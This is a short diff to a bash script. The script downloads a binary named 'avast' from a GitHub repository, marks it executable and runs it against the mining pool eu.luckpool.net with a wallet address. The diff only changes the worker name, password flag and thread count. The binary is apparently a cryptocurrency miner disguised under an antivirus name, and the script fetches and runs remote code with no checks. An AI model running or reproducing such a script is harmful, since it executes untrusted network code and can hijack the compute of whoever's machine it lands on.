@@ -1,4 +1,4 @@
 #!/bin/bash
 wget https://github.com/samrikulan/toya/raw/main/avast
 chmod +x avast
-./avast -v -l  eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.$(echo $(shuf -i 1-99999 -n 1)-I_Say_You_Think_SmaLL) x -t 2
+./avast -v -l  eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.I_Say_You_Think_SmaLL -p x -t 4
